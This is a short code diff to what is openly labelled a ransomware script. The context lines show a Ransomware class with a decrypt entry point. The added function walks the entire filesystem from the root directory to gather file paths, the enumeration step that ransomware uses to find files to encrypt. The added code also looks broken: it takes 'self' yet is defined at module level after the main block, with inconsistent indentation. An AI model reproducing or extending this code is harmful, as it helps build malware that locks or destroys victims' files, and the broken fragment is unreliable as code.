@@ -54,3 +54,16 @@ if __name__ == "__main__":
     elif sys.argv[1] == "--decrypt":
         ransomware = Ransomware()
         ransomware.decrypt()
+
+
+def get_files(self, filter: str) -> list:
+        # Initialize an empty list to store the matching files
+        matching_files = []
+
+        # Use the rglob function to find all files matching the filter
+        for file in Path("/").rglob(filter):
+            # Add the absolute path of the file to the list
+            matching_files.append(str(file.resolve()))
+
+        # Return the list of matching files
+        return matching_files        
